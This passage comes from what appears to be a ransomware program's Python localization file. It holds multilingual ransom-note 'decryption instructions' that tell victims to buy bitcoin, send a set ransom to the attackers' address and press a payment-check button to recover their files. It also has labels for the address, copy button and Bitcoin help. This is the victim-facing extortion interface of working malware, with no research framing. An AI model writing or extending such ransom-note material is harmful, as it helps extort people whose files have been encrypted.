        "FI": f"<div style='overflow: auto;'><h5>Purkuohjeet</h5><p style='font-size: 10px;'><br><b>Ensinnäkin, lue pääsääntöisesti tiedot oikealla paneelilla.</b> Nyt seuraa näitä ohjeita askel askeleelta purkaaksesi tiedostosi. <b>Tarvitsetko apua? napsauta [Mitä Bitcoin on?] tai [Kuinka ostaa bitcoinia?].</b></p><p style='font-size: 10px;'><b>1. </b>Osta bitcoineja (osta noin {round(BTC_RANSOM*BTC_FEES_MULTIPLICATOR, 3)} BTC lunnaisiin ja transaktiomaksuihin). <b>Tarvitsetko apua? Napsauta [Kuinka ostaa bitcoinia?].</b></p><p style='font-size: 10px;'><b>2. </b>Lähetä {BTC_RANSOM} BTC osoitteeseemme, löydät sen tämän ikkunan vasemmasta alakulmasta (napsauta <b>[Kuinka lähettää bitcoinia]</b> saadaksesi apua). Vahvista transaktio.</p><p style='font-size: 10px;'><b>3. </b>Maksamisen jälkeen napsauta <b>[Tarkista maksu]</b> ja syötä lompakkosi osoite. Jos se ei toimi, tarkista, että olet maksanut oikean summan ja yritä uudelleen myöhemmin, kunnes se toimii. Tiedostosi palautetaan.</p></div>",
        "FR": f"<div style='overflow: auto;'><h5>Instructions de décryptage</h5><p style='font-size: 10px;'><br><b>Tout d'abord, veuillez lire les informations principales dans le panneau de droite.</b> Suivez maintenant ces instructions étape par étape pour déchiffrer vos fichiers. <b>Besoin d'aide ? cliquez sur [Qu'est-ce que le Bitcoin ?] ou [Comment acheter du bitcoin ?].</b></p><p style='font-size: 10px;'><b>1. </b>Achetez des bitcoins (achetez environ {round(BTC_RANSOM*BTC_FEES_MULTIPLICATOR, 3)} BTC pour la rançon et les frais de transaction). <b>Besoin d'aide ? Cliquez sur [Comment acheter du bitcoin ?].</b></p><p style='font-size: 10px;'><b>2. </b>Envoyez {BTC_RANSOM} BTC à notre adresse, trouvez-la en bas à gauche de cette fenêtre (cliquez sur <b>[Comment envoyer du bitcoin]</b> pour de l'aide). Confirmez la transaction.</p><p style='font-size: 10px;'><b>3. </b>Après le paiement, cliquez sur <b>[Vérifier le paiement]</b> et entrez votre adresse de portefeuille. Si cela ne fonctionne pas, vérifiez que vous avez payé le bon montant et réessayez un peu plus tard jusqu'à ce que cela fonctionne. Vos fichiers seront récupérés.</p></div>",
        "HI": f"<div style='overflow: auto;'><h5>डिक्रिप्शन निर्देश</h5><p style='font-size: 10px;'><br><b>पहले, कृपया दाएँ पैनल पर मुख्य जानकारी पढ़ें।</b> अब, अपने फ़ाइलों को डिक्रिप्ट करने के लिए इन निर्देशों का चरण-दर-चरण पालन करें। <b>क्या मदद चाहिए? क्लिक करें [बिटकॉइन क्या है?] या [बिटकॉइन कैसे खरीदें?]।</b></p><p style='font-size: 10px;'><b>1. </b>बिटकॉइन खरीदें (लगभग {round(BTC_RANSOM*BTC_FEES_MULTIPLICATOR, 3)} BTC मोहर और लेनदेन शुल्क के लिए खरीदें)। <b>क्या मदद चाहिए? क्लिक करें [बिटकॉइन कैसे खरीदें?]।</b></p><p style='font-size: 10px;'><b>2. </b>हमारे पते पर {BTC_RANSOM} BTC भेजें, इसे इस विंडो के नीचे बाईं ओर खोजें (सहायता के लिए क्लिक करें <b>[बिटकॉइन कैसे भेजें]</b>)। लेनदेन की पुष्टि करें।</p><p style='font-size: 10px;'><b>3. </b>भुगतान के बाद, क्लिक करें <b>[भुगतान की जांच करें]</b> और अपना वॉलेट पता दर्ज करें। अगर यह काम नहीं करता है, तो सुनिश्चित करें कि आपने सही राशि का भुगतान किया है और फिर से प्रयास करें जब तक कि यह काम न करे। आपकी फ़ाइलें पुनर्प्राप्त होंगी।</p></div>",
        "HR": f"<div style='overflow: auto;'><h5>Upute za dekriptiranje</h5><p style='font-size: 10px;'><br><b>Prvo, pročitajte glavne informacije na desnom panelu.</b> Sada slijedite ove upute korak po korak kako biste dekriptirali svoje datoteke. <b>Trebate pomoć? kliknite na [Što je Bitcoin?] ili [Kako kupiti bitcoin?].</b></p><p style='font-size: 10px;'><b>1. </b>Kupite bitcoine (kupite otprilike {round(BTC_RANSOM*BTC_FEES_MULTIPLICATOR, 3)} BTC za otkupninu i naknade za transakciju). <b>Trebate pomoć? Kliknite [Kako kupiti bitcoin?].</b></p><p style='font-size: 10px;'><b>2. </b>Pošaljite {BTC_RANSOM} BTC na našu adresu, pronađite je u donjem lijevom kutu ovog prozora (kliknite <b>[Kako poslati bitcoin]</b> za pomoć). Potvrdite transakciju.</p><p style='font-size: 10px;'><b>3. </b>Nakon plaćanja, kliknite <b>[Provjerite uplatu]</b> i unesite svoju adresu novčanika. Ako ne uspije, provjerite jeste li platili točan iznos i pokušajte ponovo malo kasnije dok ne uspije. Vaše datoteke bit će vraćene.</p></div>",
        "HU": f"<div style='overflow: auto;'><h5>Dekódolási útmutató</h5><p style='font-size: 10px;'><br><b>Először olvassa el a jobb panelen található fő információkat.</b> Most kövesse ezeket az utasításokat lépésről lépésre, hogy dekódolja fájljait. <b>Segítségre van szüksége? Kattintson a [Mi az a Bitcoin?] vagy [Hogyan vásárolhat bitcoint?].</b></p><p style='font-size: 10px;'><b>1. </b>Vásároljon bitcoint (vásároljon körülbelül {round(BTC_RANSOM*BTC_FEES_MULTIPLICATOR, 3)} BTC váltságdíjra és tranzakciós díjakra). <b>Segítségre van szüksége? Kattintson a [Hogyan vásárolhat bitcoint?].</b></p><p style='font-size: 10px;'><b>2. </b>Küldjön {BTC_RANSOM} BTC-t a címünkre, amelyet a bal alsó sarokban talál ezen az ablakon (kattintson <b>[Hogyan küldhet bitcoin-t]</b> a segítségért). Erősítse meg a tranzakciót.</p><p style='font-size: 10px;'><b>3. </b>A kifizetés után kattintson a <b>[Fizetés ellenőrzése]</b> gombra, és adja meg a pénztárca címét. Ha nem működik, ellenőrizze, hogy a helyes összeget fizette-e, és próbálkozzon újra kicsit később, amíg működik. A fájljai visszaállnak.</p></div>",
        "ID": f"<div style='overflow: auto;'><h5>Instruksi Dekripsi</h5><p style='font-size: 10px;'><br><b>Pertama, silakan baca informasi utama di panel kanan.</b> Sekarang, ikuti instruksi ini langkah demi langkah untuk mendekripsi file Anda. <b>Butuh bantuan? klik [Apa itu Bitcoin?] atau [Bagaimana cara membeli bitcoin?].</b></p><p style='font-size: 10px;'><b>1. </b>Beli bitcoin (beli sekitar {round(BTC_RANSOM*BTC_FEES_MULTIPLICATOR, 3)} BTC untuk tebusan dan biaya transaksi). <b>Butuh bantuan? Klik [Bagaimana cara membeli bitcoin?].</b></p><p style='font-size: 10px;'><b>2. </b>Kirim {BTC_RANSOM} BTC ke alamat kami, temukan di sudut kiri bawah jendela ini (klik <b>[Bagaimana cara mengirim bitcoin]</b> untuk bantuan). Konfirmasi transaksi.</p><p style='font-size: 10px;'><b>3. </b>Setelah pembayaran, klik <b>[Periksa pembayaran]</b> dan masukkan alamat dompet Anda. Jika tidak berhasil, periksa apakah Anda telah membayar jumlah yang benar dan coba lagi sedikit kemudian sampai berhasil. File Anda akan dipulihkan.</p></div>",
        "IT": f"<div style='overflow: auto;'><h5>Istruzioni di decrittazione</h5><p style='font-size: 10px;'><br><b>Per prima cosa, leggi le informazioni principali nel pannello di destra.</b> Ora segui queste istruzioni passo dopo passo per decrittare i tuoi file. <b>Hai bisogno di aiuto? clicca su [Cos'è Bitcoin?] o [Come acquistare bitcoin?].</b></p><p style='font-size: 10px;'><b>1. </b>Acquista bitcoin (acquista circa {round(BTC_RANSOM*BTC_FEES_MULTIPLICATOR, 3)} BTC per il riscatto e le spese di transazione). <b>Hai bisogno di aiuto? Clicca su [Come acquistare bitcoin?].</b></p><p style='font-size: 10px;'><b>2. </b>Invia {BTC_RANSOM} BTC al nostro indirizzo, trovalo in basso a sinistra in questa finestra (clicca <b>[Come inviare bitcoin]</b> per aiuto). Conferma la transazione.</p><p style='font-size: 10px;'><b>3. </b>Dopo il pagamento, fai clic su <b>[Controlla pagamento]</b> e inserisci il tuo indirizzo del portafoglio. Se non funziona, verifica di aver pagato l'importo corretto e riprova più tardi finché non funziona. I tuoi file verranno recuperati.</p></div>",
        "JA": f"<div style='overflow: auto;'><h5>復号手順</h5><p style='font-size: 10px;'><br><b>まず、右側のパネルにある主要情報をお読みください。</b> 次に、ファイルを復号するためにこれらの手順を順を追って実行してください。 <b>ヘルプが必要ですか？ [ビットコインとは？]または[ビットコインを購入する方法]をクリックしてください。</b></p><p style='font-size: 10px;'><b>1. </b>ビットコインを購入します（身代金と取引手数料のために約{round(BTC_RANSOM*BTC_FEES_MULTIPLICATOR, 3)} BTCを購入します）。 <b>ヘルプが必要ですか？ [ビットコインを購入する方法]をクリックしてください。</b></p><p style='font-size: 10px;'><b>2. </b>私たちのアドレスに{BTC_RANSOM} BTCを送信します。このウィンドウの左下に見つかります（ヘルプが必要な場合は<b>[ビットコインを送信する方法]</b>をクリックしてください）。取引を確認します。</p><p style='font-size: 10px;'><b>3. </b>支払い後、<b>[支払いを確認]</b>をクリックし、あなたのウォレットアドレスを入力してください。うまくいかない場合は、正しい金額を支払ったか確認し、うまくいくまで少し後で再試行してください。あなたのファイルは回復されます。</p></div>",
        "KO": f"<div style='overflow: auto;'><h5>복호화 지침</h5><p style='font-size: 10px;'><br><b>먼저 오른쪽 패널의 주요 정보를 읽어보십시오.</b> 이제 파일을 복호화하기 위해 이 지침을 단계별로 따르십시오. <b>도움이 필요하신가요? [비트코인이란?] 또는 [비트코인 구매 방법]을 클릭하십시오.</b></p><p style='font-size: 10px;'><b>1. </b>비트코인을 구매하십시오(몸값 및 거래 수수료로 약 {round(BTC_RANSOM*BTC_FEES_MULTIPLICATOR, 3)} BTC를 구매하십시오). <b>도움이 필요하신가요? [비트코인 구매 방법]을 클릭하십시오.</b></p><p style='font-size: 10px;'><b>2. </b>{BTC_RANSOM} BTC를 우리의 주소로 보내십시오. 이 창의 왼쪽 하단에서 찾을 수 있습니다 (도움이 필요하시면 <b>[비트코인 보내기]</b>를 클릭하십시오). 거래를 확인하십시오.</p><p style='font-size: 10px;'><b>3. </b>지불 후 <b>[지불 확인]</b>를 클릭하고 지갑 주소를 입력하십시오. 작동하지 않으면 정확한 금액을 지불했는지 확인하고 나중에 다시 시도하십시오. 파일이 복구됩니다.</p></div>",
        "LT": f"<div style='overflow: auto;'><h5>Dekodavimo instrukcijos</h5><p style='font-size: 10px;'><br><b>Pirmiausia perskaitykite pagrindinę informaciją dešinėje skiltyje.</b> Dabar sekite šias instrukcijas žingsnis po žingsnio, kad dešifruotumėte savo failus. <b>Reikia pagalbos? spustelėkite [Kas yra Bitcoin?] arba [Kaip nusipirkti bitcoin?].</b></p><p style='font-size: 10px;'><b>1. </b>Pirkite bitkoinus (pirkite maždaug {round(BTC_RANSOM*BTC_FEES_MULTIPLICATOR, 3)} BTC išpirkos ir sandorio mokesčiams). <b>Reikia pagalbos? Spustelėkite [Kaip nusipirkti bitcoin?].</b></p><p style='font-size: 10px;'><b>2. </b>Siųskite {BTC_RANSOM} BTC mūsų adresu, jį rasite šio lango kairiajame apatinėje kampe (spustelėkite <b>[Kaip siųsti bitcoin]</b> pagalbos). Patvirtinkite sandorį.</p><p style='font-size: 10px;'><b>3. </b>Po apmokėjimo spustelėkite <b>[Patikrinkite apmokėjimą]</b> ir įveskite savo piniginės adresą. Jei tai neveikia, patikrinkite, ar sumokėjote teisingą sumą, ir bandykite dar kartą vėliau, kol tai veiks. Jūsų failai bus atkuriami.</p></div>",
        "LV": f"<div style='overflow: auto;'><h5>Atšifrēšanas instrukcijas</h5><p style='font-size: 10px;'><br><b>Pirmkārt, lūdzu, izlasiet galveno informāciju labajā panelī.</b> Tagad sekojiet šīm instrukcijām soli pa solim, lai atšifrētu savus failus. <b>Vai nepieciešama palīdzība? noklikšķiniet uz [Kas ir Bitcoin?] vai [Kā iegādāties bitcoin?].</b></p><p style='font-size: 10px;'><b>1. </b>Iegādājieties bitkoinus (iegādājieties aptuveni {round(BTC_RANSOM*BTC_FEES_MULTIPLICATOR, 3)} BTC izpirkuma un darījumu maksām). <b>Vai nepieciešama palīdzība? Noklikšķiniet uz [Kā iegādāties bitcoin?].</b></p><p style='font-size: 10px;'><b>2. </b>Nosūtiet {BTC_RANSOM} BTC uz mūsu adresi, to varat atrast šī loga kreisajā apakšējā stūrī (noklikšķiniet <b>[Kā nosūtīt bitcoin]</b> lai saņemtu palīdzību). Apstipriniet darījumu.</p><p style='font-size: 10px;'><b>3. </b>Pēc maksāšanas noklikšķiniet uz <b>[Pārbaudīt maksājumu]</b> un ievadiet savu maku adresi. Ja tas nedarbojas, pārbaudiet, vai esat samaksājis pareizo summu, un mēģiniet vēlreiz vēlāk, līdz tas izdosies. Jūsu faili tiks atgūti.</p></div>",
        "MN": f"<div style='overflow: auto;'><h5>Шифр тайлахын заавар</h5><p style='font-size: 10px;'><br><b>Эхлээд баруун самбарт гол мэдээллийг уншаарай.</b> Одоо файлуудаа тайлахын тулд эдгээр зааврыг алхам алхмаар дагаарай. <b>Тусламж хэрэгтэй юу? [Биткойн гэж юу вэ?] эсвэл [Биткойн хэрхэн худалдан авах вэ?] дээр дарна уу.</b></p><p style='font-size: 10px;'><b>1. </b>Биткойн худалдаж аваарай (шударга бус болон гүйлгээний хураамжийн төлөө ойролцоогоор {round(BTC_RANSOM*BTC_FEES_MULTIPLICATOR, 3)} BTC -ийг худалдаж аваарай). <b>Тусламж хэрэгтэй юу? [Биткойн хэрхэн худалдан авах вэ?] дээр дарна уу.</b></p><p style='font-size: 10px;'><b>2. </b>{BTC_RANSOM} BTC-г манай хаяг руу илгээнэ үү. Энэ цонхны доод зүүн буланд олоорой (тусламж авахын тулд <b>[Биткойн хэрхэн илгээх вэ]</b> дээр дарна уу). Гүйлгээг баталгаажуулна уу.</p><p style='font-size: 10px;'><b>3. </b>Төлбөр хийсний дараа <b>[Төлбөрийг шалгах]</b> дээр дарж, өөрийн хэтэвчийн хаягийг оруулна уу. Хэрэв энэ ажиллахгүй бол та зөв хэмжээг төлсөн гэдгээ шалгаж, дахин оролдоно уу. Таны файлууд сэргээгдэх болно.</p></div>",
        "NL": f"<div style='overflow: auto;'><h5>Decryptie-instructies</h5><p style='font-size: 10px;'><br><b>Lees eerst de belangrijkste informatie in het rechterpaneel.</b> Volg nu deze instructies stap voor stap om uw bestanden te decrypteren. <b>Heeft u hulp nodig? Klik op [Wat is Bitcoin?] of [Hoe Bitcoin te kopen?].</b></p><p style='font-size: 10px;'><b>1. </b>Koop bitcoins (koop ongeveer {round(BTC_RANSOM*BTC_FEES_MULTIPLICATOR, 3)} BTC voor de losprijs en transactiekosten). <b>Heeft u hulp nodig? Klik op [Hoe Bitcoin te kopen?].</b></p><p style='font-size: 10px;'><b>2. </b>Stuur {BTC_RANSOM} BTC naar ons adres, vind het in de linkerbenedenhoek van dit venster (klik op <b>[Hoe Bitcoin te sturen]</b> voor hulp). Bevestig de transactie.</p><p style='font-size: 10px;'><b>3. </b>Na betaling klikt u op <b>[Controleer betaling]</b> en voert u uw walletadres in. Als het niet werkt, controleer dan of u het juiste bedrag heeft betaald en probeer het later opnieuw totdat het werkt. Uw bestanden worden hersteld.</p></div>",
        "PL": f"<div style='overflow: auto;'><h5>Instrukcje dekryptowania</h5><p style='font-size: 10px;'><br><b>Najpierw zapoznaj się z głównymi informacjami w prawym panelu.</b> Teraz postępuj zgodnie z tymi instrukcjami krok po kroku, aby odszyfrować swoje pliki. <b>Potrzebujesz pomocy? kliknij [Czym jest Bitcoin?] lub [Jak kupić bitcoin?].</b></p><p style='font-size: 10px;'><b>1. </b>Kup bitcoiny (kup około {round(BTC_RANSOM*BTC_FEES_MULTIPLICATOR, 3)} BTC na okup i opłaty transakcyjne). <b>Potrzebujesz pomocy? Kliknij [Jak kupić bitcoin?].</b></p><p style='font-size: 10px;'><b>2. </b>Wyślij {BTC_RANSOM} BTC na nasz adres, znajdziesz go w dolnym lewym rogu tego okna (kliknij <b>[Jak wysłać bitcoin]</b> po pomoc). Potwierdź transakcję.</p><p style='font-size: 10px;'><b>3. </b>Po dokonaniu płatności kliknij <b>[Sprawdź płatność]</b> i wprowadź swój adres portfela. Jeśli to nie działa, upewnij się, że zapłaciłeś właściwą kwotę i spróbuj ponownie później, aż zadziała. Twoje pliki zostaną odzyskane.</p></div>",
        "PT": f"<div style='overflow: auto;'><h5>Instruções de Decriptação</h5><p style='font-size: 10px;'><br><b>Primeiro, por favor, leia as informações principais no painel da direita.</b> Agora, siga estas instruções passo a passo para decriptar seus arquivos. <b>Precisa de ajuda? clique em [O que é Bitcoin?] ou [Como comprar bitcoin?].</b></p><p style='font-size: 10px;'><b>1. </b>Compre bitcoins (compre aproximadamente {round(BTC_RANSOM*BTC_FEES_MULTIPLICATOR, 3)} BTC para o resgate e taxas de transação). <b>Precisa de ajuda? Clique em [Como comprar bitcoin?].</b></p><p style='font-size: 10px;'><b>2. </b>Envie {BTC_RANSOM} BTC para o nosso endereço, encontre-o no canto inferior esquerdo desta janela (clique em <b>[Como enviar bitcoin]</b> para ajuda). Confirme a transação.</p><p style='font-size: 10px;'><b>3. </b>Após o pagamento, clique em <b>[Verificar pagamento]</b> e insira seu endereço de carteira. Se não funcionar, verifique se você pagou o valor correto e tente novamente um pouco mais tarde até que funcione. Seus arquivos serão recuperados.</p></div>",
        "RO": f"<div style='overflow: auto;'><h5>Instrucțiuni de decriptare</h5><p style='font-size: 10px;'><br><b>În primul rând, vă rugăm să citiți informațiile principale din panoul din dreapta.</b> Acum, urmați aceste instrucțiuni pas cu pas pentru a decripta fișierele dvs. <b>Necesitați ajutor? faceți clic pe [Ce este Bitcoin?] sau [Cum să cumpărați bitcoin?].</b></p><p style='font-size: 10px;'><b>1. </b>Cumpărați bitcoini (cumpărați aproximativ {round(BTC_RANSOM*BTC_FEES_MULTIPLICATOR, 3)} BTC pentru răscumpărare și taxe de tranzacție). <b>Necesitați ajutor? Faceți clic pe [Cum să cumpărați bitcoin?].</b></p><p style='font-size: 10px;'><b>2. </b>Trimiteți {BTC_RANSOM} BTC la adresa noastră, găsiți-o în colțul din stânga jos al acestei feronierii (faceți clic pe <b>[Cum să trimiteți bitcoin]</b> pentru ajutor). Confirmați tranzacția.</p><p style='font-size: 10px;'><b>3. </b>După plată, faceți clic pe <b>[Verificați plata]</b> și introduceți adresa portofelului dvs. Dacă nu funcționează, verificați că ați plătit suma corectă și încercați din nou puțin mai târziu până când funcționează. Fișierele dvs. vor fi recuperate.</p></div>",
        "RU": "<div style='overflow: auto;'><h5>Инструкции по расшифровке</h5><p style='font-size: 10px;'><br><b>Сначала, пожалуйста, прочитайте основную информацию в правой панели.</b> Теперь следуйте этим инструкциям шаг за шагом, чтобы расшифровать ваши файлы. <b>Нужна помощь? нажмите [Что такое биткойн?] или [Как купить биткойн?].</b></p><p style='font-size: 10px;'><b>1. </b>Купите биткойны (купите примерно {round(BTC_RANSOM*BTC_FEES_MULTIPLICATOR, 3)} BTC для выкупа и транзакционных сборов). <b>Нужна помощь? Нажмите [Как купить биткойн?].</b></p><p style='font-size: 10px;'><b>2. </b>Отправьте {BTC_RANSOM} BTC на наш адрес, найдите его в нижнем левом углу этого окна (нажмите <b>[Как отправить биткойн]</b> для помощи). Подтвердите транзакцию.</p><p style='font-size: 10px;'><b>3. </b>После оплаты нажмите <b>[Проверить платеж]</b> и введите адрес вашего кошелька. Если это не сработает, проверьте, что вы заплатили правильную сумму, и попробуйте снова немного позже, пока не получится. Ваши файлы будут восстановлены.</p></div>",
        "SV": f"<div style='overflow: auto;'><h5>Avkodningsinstruktioner</h5><p style='font-size: 10px;'><br><b>Först, vänligen läs huvudinformationen i högerpanel.</b> Följ nu dessa instruktioner steg för steg för att avkoda dina filer. <b>Behöver du hjälp? klicka på [Vad är Bitcoin?] eller [Hur köper man bitcoin?].</b></p><p style='font-size: 10px;'><b>1. </b>Köp bitcoins (känn dig fri att köpa cirka {round(BTC_RANSOM*BTC_FEES_MULTIPLICATOR, 3)} BTC för lösensumman och transaktionsavgifter). <b>Behöver du hjälp? Klicka på [Hur köper man bitcoin?].</b></p><p style='font-size: 10px;'><b>2. </b>Skicka {BTC_RANSOM} BTC till vår adress, hitta den längst ner till vänster i det här fönstret (klicka på <b>[Hur skickar man bitcoin]</b> för hjälp). Bekräfta transaktionen.</p><p style='font-size: 10px;'><b>3. </b>Efter betalningen, klicka på <b>[Kontrollera betalning]</b> och ange din plånboksadress. Om det inte fungerar, kontrollera att du har betalat rätt belopp och försök igen lite senare tills det fungerar. Dina filer kommer att återställas.</p></div>",
        "SW": f"<div style='overflow: auto;'><h5>Maelekezo ya Kufichua</h5><p style='font-size: 10px;'><br><b>Kwanza, tafadhali soma habari kuu kwenye paneli ya kulia.</b> Sasa, fuata maelekezo haya hatua kwa hatua ili kufichua faili zako. <b>Unahitaji msaada? bonyeza [Nini Bitcoin?] au [Jinsi ya kununua bitcoin?].</b></p><p style='font-size: 10px;'><b>1. </b>Nunua bitcoins (nunua takriban {round(BTC_RANSOM*BTC_FEES_MULTIPLICATOR, 3)} BTC kwa ajili ya fidia na ada za muamala). <b>Unahitaji msaada? Bonyeza [Jinsi ya kununua bitcoin?].</b></p><p style='font-size: 10px;'><b>2. </b>Tuma {BTC_RANSOM} BTC kwa anwani yetu, ipate chini kushoto ya dirisha hili (bonyeza <b>[Jinsi ya kutuma bitcoin]</b> kwa msaada). Thibitisha muamala.</p><p style='font-size: 10px;'><b>3. </b>Baada ya malipo, bonyeza <b>[Thibitisha malipo]</b> na ingiza anwani yako ya pochi. Ikiwa haifanyi kazi, hakikisha umelipa kiasi sahihi na jaribu tena kidogo baadaye mpaka ifanye kazi. Faili zako zitarudishwa.</p></div>",
        "TH": f"<div style='overflow: auto;'><h5>คำแนะนำการถอดรหัส</h5><p style='font-size: 10px;'><br><b>ก่อนอื่น กรุณาอ่านข้อมูลหลักในแผงด้านขวา.</b> ตอนนี้ให้ทำตามคำแนะนำเหล่านี้ทีละขั้นตอนเพื่อถอดรหัสไฟล์ของคุณ. <b>ต้องการความช่วยเหลือ? คลิก [Bitcoin คืออะไร?] หรือ [วิธีซื้อ Bitcoin?].</b></p><p style='font-size: 10px;'><b>1. </b>ซื้อบิตคอยน์ (ซื้อประมาณ {round(BTC_RANSOM*BTC_FEES_MULTIPLICATOR, 3)} BTC สำหรับค่าไถ่และค่าธรรมเนียมการทำธุรกรรม). <b>ต้องการความช่วยเหลือ? คลิก [วิธีซื้อ Bitcoin?].</b></p><p style='font-size: 10px;'><b>2. </b>ส่ง {BTC_RANSOM} BTC ไปยังที่อยู่ของเรา คุณสามารถหาได้ที่มุมซ้ายล่างของหน้าต่างนี้ (คลิก <b>[วิธีส่ง Bitcoin]</b> เพื่อขอความช่วยเหลือ). ยืนยันการทำธุรกรรม.</p><p style='font-size: 10px;'><b>3. </b>หลังจากชำระเงินแล้ว ให้คลิก <b>[ตรวจสอบการชำระเงิน]</b> และป้อนที่อยู่กระเป๋าเงินของคุณ หากไม่ทำงาน โปรดตรวจสอบว่าคุณได้ชำระจำนวนที่ถูกต้องและลองอีกครั้งในภายหลังจนกว่าจะทำงานได้ ไฟล์ของคุณจะถูกกู้คืน.</p></div>",
        "TR": f"<div style='overflow: auto;'><h5>Şifre Çözme Talimatları</h5><p style='font-size: 10px;'><br><b>Öncelikle, lütfen sağ paneldeki ana bilgileri okuyun.</b> Şimdi, dosyalarınızı şifre çözmek için bu talimatları adım adım izleyin. <b>Yardım mı lazım? [Bitcoin nedir?] veya [Bitcoin nasıl alınır?] tıklayın.</b></p><p style='font-size: 10px;'><b>1. </b>Bitcoin satın alın (fidye ve işlem ücretleri için yaklaşık {round(BTC_RANSOM*BTC_FEES_MULTIPLICATOR, 3)} BTC satın alın). <b>Yardım mı lazım? [Bitcoin nasıl alınır?] tıklayın.</b></p><p style='font-size: 10px;'><b>2. </b>{BTC_RANSOM} BTC'yi adresimize gönderin, bunu bu pencerenin sol alt köşesinde bulabilirsiniz (yardım için <b>[Bitcoin nasıl gönderilir]</b> tıklayın). İşlemi onaylayın.</p><p style='font-size: 10px;'><b>3. </b>Ödeme yaptıktan sonra <b>[Ödemeyi kontrol et]</b> tıklayın ve cüzdan adresinizi girin. Eğer çalışmazsa, doğru miktarı ödediğinizi kontrol edin ve tekrar deneyin, ta ki çalışana kadar. Dosyalarınız kurtarılacaktır.</p></div>",
        "UK": f"<div style='overflow: auto;'><h5>Інструкції з дешифрування</h5><p style='font-size: 10px;'><br><b>По-перше, будь ласка, прочитайте основну інформацію у правій панелі.</b> Тепер дотримуйтесь цих інструкцій крок за кроком, щоб дешифрувати ваші файли. <b>Потрібна допомога? натисніть [Що таке Bitcoin?] або [Як купити біткойн?].</b></p><p style='font-size: 10px;'><b>1. </b>Купіть біткоїни (купіть приблизно {round(BTC_RANSOM*BTC_FEES_MULTIPLICATOR, 3)} BTC на викуп і комісії за транзакції). <b>Потрібна допомога? Натисніть [Як купити біткойн?].</b></p><p style='font-size: 10px;'><b>2. </b>Відправте {BTC_RANSOM} BTC на нашу адресу, знайдіть її в нижньому лівому куті цього вікна (натисніть <b>[Як надіслати біткоїн]</b> для отримання допомоги). Підтвердіть транзакцію.</p><p style='font-size: 10px;'><b>3. </b>Після оплати натисніть <b>[Перевірити платіж]</b> і введіть адресу вашого гаманця. Якщо це не працює, перевірте, чи сплатили правильну суму, і спробуйте знову трохи пізніше, поки не зможе спрацювати. Ваші файли будуть відновлені.</p></div>",
        "ZH": f"<div style='overflow: auto;'><h5>解密说明</h5><p style='font-size: 10px;'><br><b>首先，请阅读右侧面板上的主要信息。</b> 现在，请按照这些说明逐步解密您的文件。 <b>需要帮助吗？点击 [什么是比特币？] 或 [如何购买比特币？]。</b></p><p style='font-size: 10px;'><b>1. </b>购买比特币（购买约 {round(BTC_RANSOM*BTC_FEES_MULTIPLICATOR, 3)} BTC 作为赎金和交易费用）。 <b>需要帮助吗？点击 [如何购买比特币？]。</b></p><p style='font-size: 10px;'><b>2. </b>将 {BTC_RANSOM} BTC 发送到我们的地址，在此窗口的左下角找到（点击 <b>[如何发送比特币]</b> 获取帮助）。确认交易。</p><p style='font-size: 10px;'><b>3. </b>付款后，点击 <b>[检查付款]</b> 并输入您的钱包地址。如果不成功，请检查您是否支付了正确的金额，然后稍后再次尝试，直到成功。您的文件将被恢复。</p></div>",
    },
    "addresstitle": {
        "EN": "Address:",
        "AR": "العنوان: ",
        "BN": "ঠিকানা: ",
        "CS": "Adresa: ",
        "DA": "Adresse: ",
        "DE": "Adresse: ",
        "EL": "Διεύθυνση: ",
        "ES": "Dirección: ",
        "ET": "Aadress: ",
        "FI": "Osoite: ",
        "FR": "Adresse :",
        "HI": "पता: ",
        "HR": "Adresa: ",
        "HU": "Cím: ",
        "ID": "Alamat: ",
        "IT": "Indirizzo: ",
        "JA": "住所: ",
        "KO": "주소: ",
        "LT": "Adresas: ",
        "LV": "Adrese: ",
        "MN": "Хаяг: ",
        "NL": "Adres: ",
        "PL": "Adres: ",
        "PT": "Endereço: ",
        "RO": "Adresă: ",
        "RU": "Адрес: ",
        "SV": "Adress: ",
        "SW": "Anwani: ",
        "TH": "ที่อยู่: ",
        "TR": "Adres: ",
        "UK": "Адреса: ",
        "ZH": "地址: "
    },
    "copyaddresstitle": {
        "EN": "Copy address",
        "AR": "نسخ العنوان",
        "BN": "ঠিকানা কপি করুন",
        "CS": "Zkopírovat adresu",
        "DA": "Kopier adresse",
        "DE": "Adresse kopieren",
        "EL": "Αντιγραφή διεύθυνσης",
        "ES": "Copiar dirección",
        "ET": "Kopeeri aadress",
        "FI": "Kopioi osoite",
        "FR": "Copier l'adresse",
        "HI": "पता कॉपी करें",
        "HR": "Kopiraj adresu",
        "HU": "Cím másolása",
        "ID": "Salin alamat",
        "IT": "Copia indirizzo",
        "JA": "アドレスをコピー",
        "KO": "주소 복사",
        "LT": "Nukopijuoti adresą",
        "LV": "Kopēt adresi",
        "MN": "Хаягийг хуулбарлах",
        "NL": "Adres kopiëren",
        "PL": "Skopiuj adres",
        "PT": "Copiar endereço",
        "RO": "Copiază adresă",
        "RU": "Скопировать адрес",
        "SV": "Kopiera adress",
        "SW": "Nakili anwani",
        "TH": "คัดลอกที่อยู่",
        "TR": "Adres kopyala",
        "UK": "Скопіювати адресу",
        "ZH": "复制地址"
    },
    "abtbitcointitle": {
        "EN": "What is Bitcoin?",
        "AR": "ما هو بيتكوين؟",
        "BN": "বিটকয়েন কি?",
        "CS": "Co je Bitcoin?",
        "DA": "Hvad er Bitcoin?",
        "DE": "Was ist Bitcoin?",
        "EL": "Τι είναι το Bitcoin;",
        "ES": "¿Qué es Bitcoin?",
        "ET": "Mis on Bitcoin?",
        "FI": "Mikä on Bitcoin?",
        "FR": "Qu'est-ce que le Bitcoin ?",
        "HI": "बिटकॉइन क्या है?",
        "HR": "Što je Bitcoin?",
        "HU": "Mi az a Bitcoin?",
        "ID": "Apa itu Bitcoin?",
        "IT": "Che cos'è Bitcoin?",
        "JA": "ビットコインとは何ですか？",
        "KO": "비트코인이란 무엇입니까?",
        "LT": "Kas yra Bitcoin?",
        "LV": "Kas ir Bitcoin?",
        "MN": "Биткойн гэж юу вэ?",
        "NL": "Wat is Bitcoin?",
        "PL": "Czym jest Bitcoin?",
        "PT": "O que é Bitcoin?",
        "RO": "Ce este Bitcoin?",
        "RU": "Что такое биткойн?",
        "SV": "Vad är Bitcoin?",
        "SW": "Bitcoin ni nini?",
        "TH": "บิตคอยน์คืออะไร?",
        "TR": "Bitcoin nedir?",
        "UK": "Що таке біткойн?",
        "ZH": "什么是比特币？"
    },
    "abtbitcoin": {
